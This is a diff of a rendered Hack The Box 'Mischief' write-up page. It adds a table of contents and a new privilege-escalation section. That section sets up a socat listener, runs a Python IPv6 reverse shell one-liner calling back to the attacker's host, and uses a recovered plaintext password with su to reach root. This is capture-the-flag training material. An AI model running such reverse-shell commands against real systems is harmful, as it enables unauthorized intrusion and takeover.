@@ -1,4 +1,23 @@
-I"�K<h1 id="htb-mischief-10101092-machine-write-up">HTB Mischief (10.10.10.92) MACHINE WRITE-UP</h1>
+I"(Z<h1 id="htb-mischief-10101092-machine-write-up">HTB Mischief (10.10.10.92) MACHINE WRITE-UP</h1>
+
+<h3 id="table-of-contents">TABLE OF CONTENTS</h3>
+
+<ul>
+  <li><a href="#part-1--initial-recon">PART 1 : INITIAL RECON</a></li>
+  <li><a href="#part-2--port-enumeration">PART 2 : PORT ENUMERATION</a>
+    <ul>
+      <li><a href="#udp-port-161-snmp">UDP PORT 161 (snmp)</a></li>
+      <li><a href="#tcp-port-3366-http-ipv4">TCP PORT 3366 (http, IPv4)</a></li>
+      <li><a href="#tcp-port-80-http-ipv6">TCP PORT 80 (http, IPv6)</a></li>
+    </ul>
+  </li>
+  <li><a href="#part-3--exploitation">PART 3 : EXPLOITATION</a></li>
+  <li><a href="#part-4--generate-user-shell">PART 4 : GENERATE USER SHELL</a></li>
+  <li><a href="#part-51--privilege-escalation-loki---root">PART 5.1 : PRIVILEGE ESCALATION (loki -&gt; root)</a></li>
+  <li><a href="#part-52--privilege-escalation-www-data---root">PART 5.2 : PRIVILEGE ESCALATION (www-data -&gt; root)</a></li>
+</ul>
+
+<hr />
 
 <h2 id="part-1--initial-recon">PART 1 : INITIAL RECON</h2>
 
@@ -309,7 +328,7 @@
 
 <hr />
 
-<h2 id="part-5--privilege-escalation-loki---root">PART 5 : PRIVILEGE ESCALATION (loki -&gt; root)</h2>
+<h2 id="part-51--privilege-escalation-loki---root">PART 5.1 : PRIVILEGE ESCALATION (loki -&gt; root)</h2>
 
 <ul>
   <li>Check for interesting files in <strong><code class="highlighter-rouge">loki</code></strong>’s home directory:
@@ -377,7 +396,53 @@
   other::r-x
   
 </span></code></pre></div>    </div>
+    <p><strong>NOTE(S)</strong>:</p>
+    <ul>
+      <li>The user, <strong><code class="highlighter-rouge">loki</code></strong>, only has read (<strong><code class="highlighter-rouge">r--</code></strong>) permissions for both <strong><code class="highlighter-rouge">su</code></strong> and <strong><code class="highlighter-rouge">sudo</code></strong></li>
+      <li>Good thing we still have access to another user – <strong><code class="highlighter-rouge">www-data</code></strong></li>
+    </ul>
   </li>
 </ul>
 
+<hr />
+
+<h2 id="part-52--privilege-escalation-www-data---root">PART 5.2 : PRIVILEGE ESCALATION (www-data -&gt; root)</h2>
+
+<ul>
+  <li>Set-up a listener for IPv6:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>socat TCP6-LISTEN:4444 stdout
+</code></pre></div>    </div>
+  </li>
+  <li>Execute an IPv6 reverse shell on the web service running on <strong>port 80</strong>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::100e",4444,0,0));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'</span><span class="p">;</span> ping <span class="nt">-c</span> 2 127.0.0.1
+</code></pre></div>    </div>
+  </li>
+  <li>While inside the <strong>reverse shell</strong>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">id</span> 
+<span class="go">
+  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+</span><span class="gp">$</span><span class="w"> </span>su
+<span class="gp">$</span><span class="w"> </span>Password: lokipasswordmischieftrickery
+<span class="go">
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">   
+  uid=0(root) gid=0(root) groups=0(root)
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
+<span class="go">
+  The flag is not here, get a shell to find it!
+
+</span><span class="gp">$</span><span class="w"> </span>find / <span class="nt">-name</span> root.txt <span class="nt">-type</span> f <span class="nt">-uid</span> 0
+<span class="go">
+  /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+  /root/root.txt
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+<span class="go">
+  ae15........................7807
+
+</span></code></pre></div>    </div>
+  </li>
+</ul>
 :ET
